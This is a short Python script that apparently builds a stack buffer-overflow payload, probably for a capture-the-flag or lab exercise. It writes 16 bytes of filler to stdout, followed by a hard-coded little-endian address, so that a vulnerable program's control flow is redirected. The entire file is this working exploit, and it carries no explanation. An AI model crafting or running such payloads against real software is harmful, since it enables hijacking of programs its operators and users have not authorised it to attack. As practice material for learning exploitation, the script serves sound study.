import sys

padding = b"A" * 16
address = b"\x23\xa1\x04\x08"

payload = padding + address

sys.stdout.buffer.write(payload + b"\n")
